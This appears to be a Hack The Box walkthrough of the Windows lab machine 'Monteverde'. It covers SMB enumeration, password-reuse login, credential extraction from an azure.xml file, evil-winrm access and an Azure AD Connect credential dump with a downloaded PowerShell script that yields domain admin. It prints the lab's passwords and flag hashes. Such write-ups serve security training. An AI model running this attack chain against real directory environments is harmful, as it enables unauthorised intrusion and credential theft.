@@ -1,0 +1,107 @@
+HTB Walkthrough: Monteverde
+
+Machine: MonteverdeOS: Windows
+IP: 10.129.228.111
+Difficulty: Medium
+Category: Active Directory, Azure AD Connect
+
+Recon
+Nmap Scan
+sudo nmap -sC -sV 10.129.228.111
+
+Result:
+Port 53 - Simple DNS Plus
+Port 88 - Kerberos
+Port 135 - MSRPC
+Port 139 - NetBIOS-SSN
+Port 389 - LDAP
+Domain: MEGABANK.LOCAL
+Port 445 - SMB
+Other AD-related ports
+
+Hostname identified: MONTEVERDE
+
+SMB Enumeration
+Unauthenticated Enumeration via enum4linux
+enum4linux -A 10.129.228.111
+
+Users discovered:
+AAD_987d7f2f57d2
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+Guest
+
+Credential Discovery via Password Reuse
+Try username = password against SMB:
+
+smbclient -L \\10.129.228.111 -U SABatchJobs
+Password: SABatchJobs
+Login successful
+
+Accessing Shares
+smbclient \\10.129.228.111\users$ -U SABatchJobs
+
+Navigated to:
+cd mhope
+ls
+get azure.xml
+
+Analyzing azure.xml
+
+<S N="Password">4n0therD4y@n0th3r$</S>
+
+Found credentials for user mhope
+
+Foothold
+
+Evil-WinRM Login
+evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
+Success!
+
+User Flag
+C:\Users\mhope\Desktop\user.txt
+9c5337317a24a3350d29c8604f6224fc
+
+Privilege Escalation - Azure AD Connect Dump
+Step 1: Upload ADConnectDump Script
+wget https://raw.githubusercontent.com/fox-it/adconnectdump/master/adconnectdump.ps1
+
+Via Evil-WinRM:
+upload adconnectdump.ps1
+Step 2: Load Script in PowerShell
+. .\adconnectdump.ps1
+Azure-ADConnect -server "localhost" -db "ADSync"
+
+Output:
+[+] Domain:  MEGABANK.LOCAL
+[+] Username: administrator
+[+] Password: d0m@in4dminyeah!
+
+Domain Admin Access
+
+Evil-WinRM Login as Admin
+evil-winrm -i 10.129.228.111 -u administrator -p 'd0m@in4dminyeah!'
+
+Root Flag
+type C:\Users\Administrator\Desktop\root.txt
+ca4ac8c9cb2e293d7c3004b89e1f452a
+
+Lessons Learned
+SMB enumeration + password reuse can lead to initial access
+Azure AD Connect stores powerful credentials — often domain admin
+Evil-WinRM is the go-to for Windows post-exploitation
+Password hygiene and share permissions are critical in AD environments
+
+Tools Used
+nmap
+enum4linux
+smbclient
+evil-winrm
+PowerShell
+adconnectdump.ps1
